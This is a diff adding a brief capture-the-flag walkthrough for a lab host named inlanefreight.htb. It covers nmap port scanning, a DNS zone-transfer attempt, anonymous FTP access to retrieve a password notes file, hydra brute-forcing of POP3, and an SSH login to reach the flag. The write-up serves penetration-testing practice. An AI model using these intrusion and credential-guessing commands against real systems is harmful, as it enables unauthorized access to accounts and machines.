@@ -1,0 +1,43 @@
+Let's enumerate first
+sudo nmap -p- <Target IP>
+Open ports 22 (ssh), 53 (domain), 110 (pop3), 995(pop3s), 2121 (ccproxy-ftp), 30021 (unknown)
+Let's do a more detailed scan
+sudo nmap -sC -sV -p 22,53,110,995,2121,30021 -A -O <Target IP>
+*Found out there is a FTP port open on 30021*
+*DNS looks like an interesting approach*
+
+Let's add our domain to etc/hosts file
+sudo nano /etc/hosts
+at line 3 add: <Target IP> inlanefreight.htb
+ctrl X
+y
+<Enter>
+
+Let's use the dig tool for DNS zone transfer
+dig AXFR @inlanefreight.htb inlanefreight.htb
+*not much to see here...*
+
+Let's check FTP next, maybe we can log in anonymously
+ftp <Target IP> 30021
+Name: anonymous <Enter>
+Pass: leave empty <Enter>
+SUCCESS
+ls -al
+cd simon
+ls
+get mynotes.txt
+exit
+nano mynotes.txt
+*There seem to be passwords for something, maybe we can use hydra instead of manually trying...*
+
+Let's try brute forcing POP3 with the name simon and passwords in the mynotes.txt
+hydra -l simon -P mynotes.txt -f <Target IP> pop3
+Found matching username and password
+
+Let's log into ssh with the username and password we just found
+ssh simon@<Target IP>
+yes
+<Enter password>
+SUCCESS
+ls
+found flag.txt
